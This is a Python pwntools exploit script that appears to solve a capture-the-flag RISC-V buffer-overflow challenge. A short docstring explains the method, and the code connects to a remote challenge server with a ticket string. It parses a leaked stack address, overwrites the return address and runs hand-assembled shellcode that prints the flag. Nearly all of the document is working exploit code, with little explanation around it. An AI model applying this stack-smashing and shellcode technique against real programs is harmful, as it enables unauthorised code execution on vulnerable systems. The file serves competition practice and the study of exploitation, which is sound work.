""" Solution

    The flag string is stored in a pointer that they give to use.
    There are no memory protections on the stack, this includes no NX.
    Create shellcode, then overwrite the return address on the stack to point to our shellcode
    Our shellcode puts the flag pointer in a0, then calls puts to print out the flag

    """

from pwn import *
from time import sleep

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = "riscv_smash.quals2023-kah5Aiv9.satellitesabove.me"
PORT = 5300
TICKET = "ticket{papa358505victor4:GDSTwhC8esQVT0MvB_Wq3Elw_cMh1uVRuMWRkDUOxMXBVSHED5KgmoxFF-x4mhy2nQ}"

def get_process():
  #proc = process(['qemu-riscv32', '-g', '1235', './smash-baby'])
  proc = remote(HOST, PORT)
  proc.sendlineafter(b'Ticket please:', TICKET.encode())

  return proc

def main():
  proc = get_process()

  data = proc.readline_contains(b'Because').decode().strip()
  leak = bytes.fromhex(data[-8:])
  leak = int.from_bytes(leak, 'big')
  leak = leak - 0x4c

  shellcode = b''.join([
    b'\x13\x85\x04\x00', # mv a0,s1
    b'\xb7\x5a\x01\x00', # lui s5,0x15
    b'\x93\x8a\xea\x4e', # addiw s5,s5,1262
    b'\x67\x80', # jr s5
  ])
  payload = b''.join([
    b'ACEGBB',
    b'A'*36,
    p32(leak),
    shellcode
  ])

  proc.sendlineafter(b'Exploit me!', payload)
  log.info(proc.readline_contains(b'flag').decode())

if __name__ == '__main__':
  main()
